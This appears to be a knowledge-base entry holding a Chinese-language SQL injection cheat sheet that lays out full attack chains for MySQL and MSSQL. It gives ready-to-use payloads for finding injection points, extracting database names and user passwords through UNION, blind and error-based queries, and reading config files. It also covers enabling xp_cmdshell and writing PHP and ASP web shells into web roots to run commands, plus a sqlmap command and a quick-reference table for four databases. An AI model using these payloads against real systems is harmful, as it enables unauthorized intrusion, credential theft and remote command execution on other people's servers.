knowledge: "# SQL注入攻击链\n\n## MySQL注入完整利用链\n\n### 基础探测 → 获取Shell\n\n```\n1. 探测注入点\n   ' OR '1'='1\n\n2. 确定列数\n   ' ORDER BY\
  \ 1--\n   ' ORDER BY 2-- (报错则列数为2)\n\n3. 确定显示位置\n   ' UNION SELECT 1,2,3--\n\n4. 获取数据库信息\n   ' UNION SELECT 1,database(),version()--\n\
  \n5. 获取网站绝对路径\n   ' UNION SELECT 1,@@basedir,load_file('/var/www/html/config.php')--\n\n6. 写入WebShell\n   ' UNION SELECT\
  \ 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--\n\n7. 执行命令\n   http://target/shell.php?cmd=whoami\n\
  ```\n\n### 盲注 → 获取数据\n\n```\n1. 确认盲注\n   ' AND 1=1-- (正常)\n   ' AND 1=2-- (异常)\n\n2. 获取数据库名长度\n   ' AND LENGTH(database())=4--\n\
  \n3. 逐字符提取\n   ' AND ASCII(SUBSTRING(database(),1,1))=97--\n\n4. 使用sqlmap自动化\n   sqlmap -u \"http://target?id=1\" --dbs\n\
  ```\n\n### 报错注入 → 快速提取\n\n```\n1. 确认报错注入\n   ' AND extractvalue(1,concat(0x7e,version()))--\n\n2. 获取数据库\n   ' AND extractvalue(1,concat(0x7e,database()))--\n\
  \n3. 获取表名\n   ' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--\n\
  \n4. 获取数据\n   ' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--\n```\n\n---\n\n## MSSQL注入完整利用链\n\
  \n### 基础 → xp_cmdshell\n\n```\n1. 探测注入点\n   ' OR 1=1--\n\n2. 获取版本\n   ' UNION SELECT 1,@@version,3--\n\n3. 检测xp_cmdshell\n\
  \   '; EXEC master..xp_cmdshell 'whoami'--\n\n4. 开启xp_cmdshell\n   '; EXEC sp_configure 'show advanced options',1; RECONFIGURE;\
  \ EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--\n\n5. 执行命令\n   '; EXEC master..xp_cmdshell 'whoami'--\n\n6. 写入WebShell\n\
  \   '; EXEC master..xp_cmdshell 'echo ^<%eval(request(\"cmd\"))^> > C:\\inetpub\\wwwroot\\shell.asp'--\n```\n\n---\n\n##\
  \ 攻击链速查表\n\n| 阶段 | MySQL | MSSQL | PostgreSQL | Oracle |\n|------|-------|-------|------------|--------|\n| 探测 | `' OR '1'='1`\
  \ | `' OR 1=1--` | `' OR 1=1--` | `' OR 1=1--` |\n| 列数 | ORDER BY N | ORDER BY N | ORDER BY N | UNION NULL |\n| 信息 | database()\
  \ | @@version | version() | v$version |\n| 写文件 | INTO OUTFILE | xp_cmdshell | COPY TO | UTL_FILE |\n"
